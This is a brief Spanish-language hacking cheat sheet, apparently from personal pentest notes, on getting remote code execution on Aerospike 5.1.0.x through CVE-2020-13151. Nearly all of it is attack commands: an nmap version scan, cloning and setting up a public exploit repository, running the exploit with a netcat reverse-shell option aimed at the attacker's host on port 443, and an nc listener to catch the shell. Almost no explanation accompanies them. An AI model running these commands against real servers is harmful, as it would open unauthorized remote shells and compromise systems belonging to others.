# AeroSpike Database 5.1.0.x 

Tags: #CGMS #Linux #AeroSpike 

Aerospike es un sistema de gestión de bases de datos NoSQL distribuido, de alto rendimiento y en tiempo real. Está diseñado para aplicaciones críticas que manejan grandes volúmenes de datos (desde gigabytes hasta petabytes) y que requieren tiempos de respuesta ultrarrápidos, generalmente en el orden de los submilisegundos

```bash 
# Identificar la versión y alguna descripción del puerto 
❯ nmap -sV -p 3003 IP  
```

## Versión 5.1.0.x - RCE 
* [PoC - RCE](https://github.com/b4ny4n/CVE-2020-13151/)
```bash 
❯ git clone https://github.com/b4ny4n/CVE-2020-13151/ && cd CVE-2020-13151 && apt install -y python3-venv python3-full build-essential python3-dev && python3 -m venv venv && source venv/bin/activate && python -m pip install --upgrade pip && python -m pip install aerospike
```

```bash 
# Ejecutar el exploit 
❯ python3 cve2020-13151.py --ahost IP_Server --netcatshell --lhost=IP_Kali --lport=443 

❯ rlwrap nc -nlvp 443   # Ponerse en escucha e Kali 
```